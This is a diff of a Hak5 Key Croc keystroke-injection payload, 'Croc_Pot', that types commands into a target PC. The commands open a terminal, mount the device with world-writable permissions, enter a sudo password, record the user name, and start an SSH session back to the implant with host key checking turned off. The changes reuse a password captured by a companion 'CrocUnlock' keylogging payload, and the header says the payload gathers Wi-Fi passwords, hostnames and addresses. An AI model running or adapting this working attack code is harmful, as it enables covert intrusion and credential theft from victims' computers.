@@ -4,7 +4,7 @@
 #                (ip address, current user name, pc host name, ssid and passwd, mac address)
 #                save to tools/Croc_pot folder
 # Author:        Spywill
-# Version:       1.3.1
+# Version:       1.3.3
 # Category:      Key Croc
 
 MATCH crocpot
@@ -12,8 +12,13 @@ MATCH crocpot
 #---> Edit KEYCROC_PASSWD_HERE
 CROC_PW=hak5croc
 
+#---> Check for target pc saved passwd run CrocUnlock payload first if not edit below
+if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
+	PC_PW=$(sed '$!d' /root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered)
+else
 #---> Edit LINUX-PC_PASSWD_HERE
-PC_PW=LINUX
+	PC_PW=LINUX
+fi
 
 #---> Save keycroc passwd in temp folder
 #---> This is used for starting Reverse SSH Tunnel with Target PC
@@ -94,7 +99,7 @@ WINDOWS)
 	ATTACKMODE HID
 	sleep 1
 	#---> Start SSH session with target PC
-	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER
 	sleep 2
 	#---> Entering keycroc passwd
@@ -124,7 +129,7 @@ MACOS)
 	Q ENTER
 	sleep 2
 	#---> Start SSH session with target PC
-	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER
 	sleep 2
 	#---> Entering keycroc passwd
@@ -147,16 +152,23 @@ LINUX)
 	#---> After TARGET_HOSTNAME scan case TARGET_HOSTNAME value
 	case $TARGET_HOSTNAME in
 raspberrypi)
-	#---> Start Raspberry pi 4 terminal -->gnome-terminal installed<--
+	#---> Copy LXTerminal to desktop
 	Q GUI d
+	Q CONTROL-ALT-F1
 	sleep 1
-	Q STRING "terminal"
+	Q STRING "cp -u /usr/share/applications/lxterminal.* /home/\$(whoami)/Desktop"
+	Q ENTER
+	Q ALT-F7
+	#---> Start Raspberry pi 4 LXTerminal
+	sleep 1
+	Q STRING "LXTerminal"
 	Q ENTER
 	Q ENTER
 	sleep 2
 	#---> Place keycroc usb drive into variable
 	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
 	Q ENTER
+	sleep 1
 	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
 	Q STRING "whoami | tee \${PC_USER}"
 	Q ENTER
@@ -193,7 +205,7 @@ raspberrypi)
 	ATTACKMODE HID
 	sleep 1
 	#---> Start SSH session with target PC
-	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER
 	sleep 2
 	#---> Entering keycroc passwd
@@ -214,24 +226,18 @@ parrot)
 	Q STRING "mate-terminal"
 	Q ENTER
 	sleep 1
-	#---> Create keycroc directory
-	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
+	#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
+	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/; "
 	Q ENTER
+	sleep 1
 	#---> Entering Linux passwd
 	Q STRING "${PC_PW}"
-	Q ENTER
-	sleep 1
-	#---> Mount keycroc usb drive to target pc
-	Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
-	Q ENTER
-	sleep 1
-	#---> Make KeyCroc folder executable
-	Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 	Q ENTER
 	sleep 1
 	#---> Place keycroc usb drive into variable
 	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
 	Q ENTER
+	sleep 1
 	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
 	Q STRING "whoami | tee \${PC_USER}"
 	Q ENTER
@@ -273,9 +279,9 @@ parrot)
 	#---> Remove keycroc directory off target pc
 	Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
 	Q ENTER
-	sleep 2
+	sleep 1
 	#---> Start SSH session with target PC
-	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER
 	sleep 1
 	#---> Entering keycroc passwd
@@ -297,24 +303,18 @@ parrot)
 	Q STRING "xterm"
 	Q ENTER
 	sleep 1
-	#---> Create keycroc directory
-	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/"
+	#---> Create keycroc directory, Mount keycroc usb drive to target pc, Make KeyCroc folder executable
+	Q STRING "sudo mkdir /media/\$(whoami)/KeyCroc/; sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0; sudo chmod 777 /media/\$(whoami)/KeyCroc/; "
 	Q ENTER
+	sleep 1
 	#---> Entering Linux passwd
 	Q STRING "${PC_PW}"
-	Q ENTER
-	sleep 1
-	#---> Mount keycroc usb drive to target pc
-	Q STRING "sudo mount /dev/sdd /media/\$(whoami)/KeyCroc/ -o rw,users,umask=0"
-	Q ENTER
-	sleep 1
-	#---> Make KeyCroc folder executable
-	Q STRING "sudo chmod 777 /media/\$(whoami)/KeyCroc/"
 	Q ENTER
 	sleep 1
 	#---> Place keycroc usb drive into variable
 	Q STRING "PC_USER=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/Croc_OS_Target.txt"
 	Q ENTER
+	sleep 1
 	#---> Retrieve target PC user name & save to tools/Croc_Pot/Croc_OS_Target.txt
 	Q STRING "whoami | tee \${PC_USER}"
 	Q ENTER
@@ -356,9 +356,9 @@ parrot)
 	#---> Remove keycroc directory off target pc
 	Q STRING "sudo rmdir /media/\$(whoami)/KeyCroc/"
 	Q ENTER
-	sleep 2
+	sleep 1
 	#---> Start SSH session with target PC
-	Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
+	Q STRING "ssh -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER
 	sleep 1
 	#---> Entering keycroc passwd
